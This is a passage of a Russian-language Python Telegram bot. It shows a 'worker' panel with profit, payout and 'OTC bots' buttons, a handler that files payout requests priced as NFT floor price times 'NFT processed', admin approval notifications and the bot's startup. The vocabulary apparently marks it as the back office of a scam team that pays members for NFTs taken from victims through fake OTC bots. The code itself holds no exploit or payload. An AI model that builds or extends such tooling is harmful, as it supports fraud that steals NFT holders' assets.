            worker_message += f"🔧 Ваша цена: {context.user_data.get('manual_floor')} TON\n\n"
        worker_message += (
            f"📊 <b>Статистика:</b>\n"
            f"💰 Профиты: <code>{total_profits:.2f}</code> TON\n"
            f"💳 Выплачено: <code>{total_payouts:.2f}</code> TON\n"
            f"🏦 На выплату: <code>{total_profits - total_payouts:.2f}</code> TON"
        )
        
        keyboard = [
            [InlineKeyboardButton("💵 Заявка на выплату", callback_data='worker_payout')],
            [InlineKeyboardButton("🤖 ОТС боты", callback_data='worker_otc')],
            [InlineKeyboardButton("💳 Канал Выплат", url=PAYOUTS_CHANNEL)],
            [InlineKeyboardButton("⚡️ Канал Профитов", url=PROFITS_CHANNEL)]
        ]
        
        await update.message.reply_text(
            worker_message,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    except Exception as e:
        logger.error(f"Ошибка в функции worker_command: {e}", exc_info=True)
        await update.message.reply_text("🚫 Произошла ошибка.", parse_mode="HTML")

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик фотографий для шага 3 заявки на выплату"""
    try:
        user_id = update.message.from_user.id
        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')
        
        logger.info(f"Получено фото от пользователя {user_id}, payout_step={context.user_data.get('payout_step')}")
        
        # Проверяем, на каком шаге находится пользователь
        if context.user_data.get('payout_step') == 3:
            # Инициализируем payout_data, если не существует
            if 'payout_data' not in context.user_data:
                context.user_data['payout_data'] = {}
            
            # Сохраняем фото
            photo_file_id = update.message.photo[-1].file_id
            context.user_data['payout_data']['screenshot'] = photo_file_id
            
            # Получаем данные для создания заявки
            wallet = context.user_data['payout_data'].get('wallet')
            nft_link = context.user_data['payout_data'].get('nft_link')
            
            logger.info(f"Файл фото: {photo_file_id[:20]}..., wallet={wallet[:20]}..., nft_link={nft_link[:30]}...")
            
            # Расчитываем реальную сумму выплаты: floor_price * количество NFT
            floor_price = get_floor(PORTALS_COLLECTION_ADDRESS)
            # применяем пользовательский оверрайд, затем глобальный
            if context.user_data.get('manual_floor') is not None:
                floor_price = context.user_data.get('manual_floor')
            else:
                global manual_floor_price
                if manual_floor_price is not None:
                    floor_price = manual_floor_price
            profit_stats = get_user_profit_stats(user_id)

            if floor_price and profit_stats['nft_processed'] > 0:
                nft_count = profit_stats['nft_processed']
                raw_amount = floor_price * nft_count
                # guardrails: никогда не выплачиваем больше, чем накоплено профита
                max_allowed = profit_stats['total_profit'] or user_data[user_id].get('balance', 0)
                if raw_amount > max_allowed * 2:  # немного допускаем превышение
                    logger.warning(
                        f"Подозрительно большая сумма payout ({raw_amount:.4f}) от floor={floor_price:.4f} * "
                        f"nft_count={nft_count}; ограничиваем по профиту ({max_allowed:.4f})"
                    )
                    amount = max_allowed
                else:
                    amount = raw_amount
                logger.info(f"Сумма выплаты: {floor_price:.4f} TON * {nft_count} NFT = {amount:.4f} TON")
            else:
                # Fallback: используем профит или баланс
                amount = profit_stats['total_profit'] or user_data[user_id].get('balance', 0)
                logger.info(f"Используем fallback сумму: {amount:.4f} TON")
            
            if not wallet or not nft_link:
                logger.error(f"Ошибка: неполные данные. wallet={bool(wallet)}, nft_link={bool(nft_link)}")
                await update.message.reply_text(
                    "❌ Ошибка: не все данные заполнены. Пожалуйста, начните заново с /worker.",
                    parse_mode="HTML"
                )
                context.user_data.pop('payout_step', None)
                context.user_data.pop('payout_data', None)
                return
            
            # Создаем заявку на выплату
            conn = sqlite3.connect(DB_NAME)
            cursor = conn.cursor()
            request_id = str(uuid.uuid4())[:12]
            
            try:
                logger.info(f"Вставляю в БД заявку: request_id={request_id}, user_id={user_id}, amount={amount}")
                cursor.execute('''
                    INSERT INTO payout_requests (request_id, user_id, wallet, nft_link, screenshot, amount, status, created_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))
                ''', (request_id, user_id, wallet, nft_link, photo_file_id, amount, 'pending'))
                
                conn.commit()
                logger.info(f"Заявка успешно создана в БД: {request_id}")
            except Exception as db_e:
                logger.error(f"Ошибка БД при создании заявки: {db_e}")
                conn.rollback()
                raise
            finally:
                conn.close()
            
            # Очищаем данные
            context.user_data.pop('payout_step', None)
            context.user_data.pop('payout_data', None)
            
            # Отправляем подтверждение
            keyboard = [[InlineKeyboardButton("📊 В меню", callback_data='menu')]]
            await update.message.reply_text(
                (
                    f"✅ <b>Заявка на выплату создана!</b>\n\n"
                    f"📋 ID заявки: <code>{request_id}</code>\n"
                    f"💰 Сумма: <code>{amount:.2f}</code> TON\n"
                    f"👛 Кошелек: <code>{wallet}</code>\n\n"
                    f"⏳ Статус: В ожидании одобрения\n\n"
                    f"Администратор рассмотрит вашу заявку в течение 24 часов."
                ),
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            
            # Уведомляем админов
            try:
                seller_display = await get_user_display_name(context, user_id)
                # убираем изображения из текста, который мог быть вставлен в поле NFT
                nft_link = sanitize_nft_text(nft_link)
                # include floor price and nft count for transparency
                nft_count = profit_stats['nft_processed']
                notification_text = (
                    f"📤 <b>Новая заявка на выплату</b>\n\n"
                    f"👤 <b>Воркер:</b> {seller_display}\n"
                    f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
                    f"💰 <b>Сумма:</b> <code>{amount:.2f}</code> TON\n"
                    f"   (floor {floor_price or 0:.4f} × {nft_count} NFT)\n\n"
                    f"👛 <b>Кошелек:</b> <code>{wallet}</code>\n\n"
                    f"🖼 <b>NFT:</b>\n{nft_link}\n\n"
                    f"📋 <b>ID заявки:</b> <code>{request_id}</code>"
                )
                
                # Кнопки для врата/отклонения
                approve_keyboard = [
                    [
                        InlineKeyboardButton("✅ Принять", callback_data=f'approve_payout_{request_id}'),
                        InlineKeyboardButton("❌ Отклонить", callback_data=f'reject_payout_{request_id}')
                    ]
                ]
                
                logger.info(f"Отправляю уведомление админам о заявке {request_id}")
                
                # Отправляем скриншот со всей информацией в caption
                for admin_id_loop in ADMIN_ID:
                    try:
                        await context.bot.send_photo(
                            chat_id=admin_id_loop,
                            photo=photo_file_id,
                            caption=notification_text,
                            parse_mode="HTML",
                            reply_markup=InlineKeyboardMarkup(approve_keyboard)
                        )
                        logger.info(f"Уведомление с фото отправлено админу {admin_id_loop}")
                    except Exception as admin_e:
                        logger.error(f"Ошибка при отправке админу {admin_id_loop}: {admin_e}")
                
                # Также отправляем в notification chat если установлен
                if NOTIFICATION_CHAT_ID:
                    try:
                        await context.bot.send_photo(
                            chat_id=NOTIFICATION_CHAT_ID,
                            photo=photo_file_id,
                            caption=notification_text,
                            parse_mode="HTML",
                            reply_markup=InlineKeyboardMarkup(approve_keyboard)
                        )
                        logger.info(f"Уведомление с фото отправлено в чат {NOTIFICATION_CHAT_ID}")
                    except Exception as chat_e:
                        logger.error(f"Ошибка при отправке в чат {NOTIFICATION_CHAT_ID}: {chat_e}")
                        
            except Exception as notif_e:
                logger.error(f"Ошибка при отправке уведомления: {notif_e}")
            
        else:
            logger.warning(f"Пользователь {user_id} отправил фото вне заявки (step={context.user_data.get('payout_step')})")
            await update.message.reply_text(
                "🚫 Фотографии можно отправлять только при заполнении заявки на выплату.\n\n"
                "Используйте /worker для начала процесса.",
                parse_mode="HTML"
            )
    
    except Exception as e:
        logger.error(f"Ошибка при обработке фото: {e}", exc_info=True)
        await update.message.reply_text(
            "🚫 Ошибка при обработке фото. Пожалуйста, попробуйте ещё раз.",
            parse_mode="HTML"
        )

def main():
    try:
        init_db()
        load_data()
        logger.info("База данных инициализирована и данные загружены.")

        application = Application.builder().token(BOT_TOKEN).build()

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CallbackQueryHandler(button))
        application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

        logger.info("Бот запущен.")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Ошибка в main: {e}", exc_info=True)

if __name__ == '__main__':
    main()
